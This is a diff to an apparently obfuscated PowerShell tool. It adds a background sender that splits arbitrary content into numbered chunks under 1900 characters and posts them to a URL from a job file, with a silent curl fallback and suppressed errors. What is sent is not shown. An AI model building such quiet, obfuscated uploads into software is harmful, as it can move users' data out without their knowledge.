@@ -182,7 +182,7 @@ function New-BufferedPanel {
 
 
 
-$script:version = "V1.60"
+$script:version = "V1.61"
 $errorLogFile = Join-Path $env:TEMP (S("YnNtYXBfZXJyb3IubG9n"))
 
 function WEL {
@@ -1629,20 +1629,31 @@ function Send-ConnErrorBg {
                 if (-not (Test-Path -LiteralPath $senderPs1)) {
                     $senderCode = @'
 param([string]$job)
+function Post-Chunk([string]$u,[string]$text) {
+    $p = @{content=$text} | ConvertTo-Json -Compress
+    $b8=[System.Text.Encoding]::UTF8.GetBytes($p)
+    try { Invoke-RestMethod -Uri $u -Method Post -Body $b8 -ContentType 'application/json; charset=utf-8' -TimeoutSec 6 -UseBasicParsing -ErrorAction Stop | Out-Null; return $true } catch {}
+    try {
+        $t = [IO.Path]::GetTempFileName()+'.json'
+        [IO.File]::WriteAllText($t, $p, (New-Object System.Text.UTF8Encoding $false))
+        & curl.exe -s -X POST -H 'Content-Type: application/json' --data-binary "@$t" $u --max-time 8 -o NUL 2>$null
+        Remove-Item $t -Force -ErrorAction SilentlyContinue
+        return $true
+    } catch { return $false }
+}
 try {
     $j = Get-Content -LiteralPath $job -Raw -ErrorAction Stop | ConvertFrom-Json
     $u = [string]$j.url; $c = [string]$j.content
-    $p = @{content=$c} | ConvertTo-Json -Compress
-    $b8=[System.Text.Encoding]::UTF8.GetBytes($p)
-    try { Invoke-RestMethod -Uri $u -Method Post -Body $b8 -ContentType 'application/json; charset=utf-8' -TimeoutSec 6 -UseBasicParsing -ErrorAction Stop | Out-Null }
-    catch {
-        try {
-            $t = [IO.Path]::GetTempFileName()+'.json'
-            [IO.File]::WriteAllText($t, $p, (New-Object System.Text.UTF8Encoding $false))
-            & curl.exe -s -X POST -H 'Content-Type: application/json' --data-binary "@$t" $u --max-time 8 -o NUL 2>$null
-            Remove-Item $t -Force -ErrorAction SilentlyContinue
-        } catch {}
+    $chunks = @()
+    $cc = $c
+    while ($cc.Length -gt 0) {
+        $n = [Math]::Min(1900, $cc.Length); $cut = $n
+        if ($cc.Length -gt 1900) { $sp = $cc.LastIndexOf("`n", $n); if ($sp -gt 1200) { $cut = $sp } }
+        $chunks += ($cc.Substring(0, $cut))
+        if ($cut -ge $cc.Length) { $cc = "" } else { $cc = $cc.Substring($cut) }
     }
+    $i = 0
+    foreach ($ch in $chunks) { $i++; $t2 = $ch; if ($chunks.Count -gt 1) { $t2 = "[parte $i/$($chunks.Count)]`n" + $ch }; [void](Post-Chunk $u $t2) }
 } catch {}
 try { Remove-Item -LiteralPath $job -Force -ErrorAction SilentlyContinue } catch {}
 '@
